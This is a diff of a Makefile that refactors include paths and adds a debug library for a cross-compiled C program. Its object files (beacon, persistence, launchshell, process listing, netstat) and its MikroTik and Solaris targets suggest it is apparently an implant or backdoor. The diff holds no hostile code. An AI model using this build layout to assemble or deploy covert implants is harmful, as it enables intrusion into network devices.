@@ -10,53 +10,48 @@ CC := $(shell which gcc)
 MD5SUM := $(shell which md5sum)
 STRIP := $(shell which strip)
 
+COMMON = ../common
+CRYPTO = $(COMMON)/crypto
+SSL = $(COMMON)/ssl/library
+BZIP2 = $(COMMON)/bzip2
+STRINGS = $(COMMON)/strings
+LIBSSL = $(SSL)/libpolarssl.a
+LIBBZIP2 = $(BZIP2)/libbz2.a
+LIBCRYPTO = $(CRYPTO)/libcrypto.a
+LIBDEBUG = $(COMMON)/debug/libdebug.a
+
+INCLUDES = -I. -I$(BZIP2) -I$(CRYPTO) -I$(BZIP2) -I$(COMMON)/ssl/include -I../debug
+
 #Default FLAGS
 CFLAGS := -Wall -Wextra -ansi -std=gnu99
-CFLAGS += -I. -I .. -I../common -I../common/crypto -I../crypto -I../../crypto -I../../common/crypto
-CFLAGS += -I../../common/ssl/include -I../common/ssl/include -I../include -I../common/bzip2
+CFLAGS += $(INCLUDES)
 CFLAGS += -D_USE_BASH
 
 LDFLAGS = -lpthread
 
 # TARGET Configuration
 ifeq ("$(TARGET)", "linux-x86")
-  include ../common/Makefile-include.linux-x86
+  include $(COMMON)/Makefile-include.linux-x86
 else ifeq ("$(TARGET)", "linux-x86_64")
-  include ../common/Makefile-include.linux-x86_64
+  include $(COMMON)/Makefile-include.linux-x86_64
 else ifeq ("$(TARGET)", "mikrotik-mips")
-  include ../common/Makefile-include.mikrotik-mips
+  include $(COMMON)/Makefile-include.mikrotik-mips
 else ifeq ("$(TARGET)", "mikrotik-mipsel")
-  include ../common/Makefile-include.mikrotik-mipsel
+  include $(COMMON)/Makefile-include.mikrotik-mipsel
 else ifeq ("$(TARGET)", "mikrotik-x86")
-  include ../common/Makefile-include.mikrotik-x86
+  include $(COMMON)/Makefile-include.mikrotik-x86
 else ifeq ("$(TARGET)", "mikrotik-ppc")
-  include ../common/Makefile-include.mikrotik-ppc
+  include $(COMMON)/Makefile-include.mikrotik-ppc
 else ifeq ("$(TARGET)", "arm")
-  include ../common/Makefile-include.arm
+  include $(COMMON)/Makefile-include.arm
 else ifeq ("$(TARGET)", "solaris-sparc")
-  include ../common/Makefile-include.solaris-sparc
+  include $(COMMON)/Makefile-include.solaris-sparc
 else ifeq ("$(TARGET)", "solaris-x86")
-  include ../common/Makefile-include.solaris-x86
-endif
-
-ifdef DEBUG
-  CFLAGS += -DDEBUG -D_DEBUG -g -O0 -DPOLARSSL_DEBUG_C -DPOLARSSL_DEBUG_MSG
-else
-  CFLAGS += -Os
+  include $(COMMON)/Makefile-include.solaris-x86
 endif
 
 BINARY = .
 LIB = .
-
-COMMON = ../common
-CRYPTO = $(COMMON)/crypto
-SSL = $(COMMON)/ssl/library
-BZIP2 = $(COMMON)/bzip2
-STRINGS = $(COMMON)/strings
-INCLUDES = -I$(SSL)/include -I$(BZIP2) -I../common -I.
-LIBSSL = $(SSL)/libpolarssl.a
-LIBBZIP2 = $(BZIP2)/libbz2.a
-LIBCRYPTO = $(CRYPTO)/libcrypto.a
 
 .PHONY: ARCH_BUILD $(BZIP2)/ARCH_BUILD $(CRYPTO)/ARCH_BUILD $(SSL)/ARCH_BUILD $(STRINGS)/ARCH_BUILD
 include ARCH_BUILD
@@ -73,9 +68,20 @@ OBJS =	beacon.o persistence.o launchshell.o \
 	get_data.o process_list.o netstat_an.o netstat_rn.o ifconfig.o compression.o \
 	init_strings.o
 
-LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO)
+LIBS = $(LIBBZIP2) $(LIBCRYPTO) $(LIBSSL) $(LIBCRYPTO) $(LIBDEBUG)
 
 # Debug Configuration
+ifdef DEBUG
+  CFLAGS += -DDEBUG -D_DEBUG -g -O0
+  LIBS += $(LIBDEBUG)
+  ifeq ("$(DEBUG)", "2")	
+    CFLAGS += -DPOLARSSL_DEBUG_C -DPOLARSSL_DEBUG_MSG
+  endif
+else
+  CFLAGS += -Os
+  LIBDEBUG :=
+endif
+
 PS = process_list.c
 NETSTAT = netstat_an.c netstat_rn.c
 IFC = ifconfig.c
@@ -140,6 +146,16 @@ else
   STRINGS_REBUILD:=force-rebuild
 endif
 
+ifdef ARCH_BUILD_DEBUG
+  ifneq ("$(ARCH_BUILD_DEBUG)", "$(TARGET)")
+    DEBUG_REBUILD:=force-rebuild
+  else
+    DEBUG_REBUILD:=
+  endif
+else
+  DEBUG_REBUILD:=force-rebuild
+endif
+
 $(info =========================================================================)
 $(info .  TARGET: $(TARGET))
 $(info .  SRCDIR: $(PWD))
@@ -149,19 +165,22 @@ $(info . LDFLAGS: $(LDFLAGS))
 $(info =========================================================================)
 $(info )
 
-.SILENT:
+#.SILENT:
 
 .PHONY: all
 all: $(SERVER)
 
 $(LIBSSL): $(SSL_REBUILD)
-	cd $(SSL) && $(MAKE) CFLAGS="$(CFLAGS)" TARGET=$(TARGET)
+	cd $(SSL) && $(MAKE) TARGET=$(TARGET)
 
 $(LIBBZIP2): $(BZIP2_REBUILD)
-	cd $(BZIP2) && $(MAKE) CFLAGS="$(CFLAGS)" TARGET=$(TARGET)
+	cd $(BZIP2) && $(MAKE) TARGET=$(TARGET)
 
 $(LIBCRYPTO): $(CRYPTO_REBUILD)
-	cd $(CRYPTO) && $(MAKE) CFLAGS="$(CFLAGS)" TARGET=$(TARGET)
+	cd $(CRYPTO) && $(MAKE) TARGET=$(TARGET)
+
+$(LIBDEBUG): $(DEBUG_REBUILD)
+	cd $(COMMON)/debug && $(MAKE) TARGET=$(TARGET)
 
 .PHONY: debug
 debug: $(SERVER)-dbg
@@ -169,7 +188,7 @@ debug: $(SERVER)-dbg
 .PHONY: release
 release: $(SERVER)
 
-$(SERVER): $(SERVER_REBUILD) $(LIBCRYPTO) proj_strings.h $(OBJS) $(LIBSSL) $(LIBBZIP2) $(STRINGS)/string_utils.o
+$(SERVER): $(SERVER_REBUILD) $(LIBCRYPTO) proj_strings.h $(OBJS) $(LIBSSL) $(LIBBZIP2) $(STRINGS)/string_utils.o $(LIBDEBUG)
 	if ! test $(DEBUG); then \
 		printf "\tLD\t\t$@\n"; \
 		$(CC) $(CFLAGS) $(OBJS) $(LDFLAGS) $(STRINGS)/string_utils.o $(LIBS) -o $@; \
